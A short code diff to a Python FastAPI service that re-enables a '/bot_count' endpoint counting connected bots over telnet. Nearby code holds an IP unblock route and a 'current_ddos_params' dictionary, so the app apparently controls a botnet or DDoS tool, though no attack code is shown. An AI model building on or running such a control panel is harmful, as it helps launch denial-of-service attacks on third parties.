@@ -62,10 +62,10 @@ async def ub_ip(ip: str = Query(...)):
     except Exception as e:
         raise HTTPException(status_code=500, detail=f"Error unblocking IP: {str(e)}")
 
-#from bot_count_service import start_telnet_session, get_bot_count_from_all_windows
+from bot_count_service import start_telnet_session, get_bot_count_from_all_windows
 from time import sleep
 
-"""
+
 telnet_session_started = False
 @app.get("/bot_count")
 async def count_connected_bots():
@@ -80,7 +80,7 @@ async def count_connected_bots():
     
     except Exception as e:
         raise HTTPException(status_code=500, detail=f"Error retrieving bot count: {str(e)}")
-"""
+
 
 current_ddos_params = {}
 
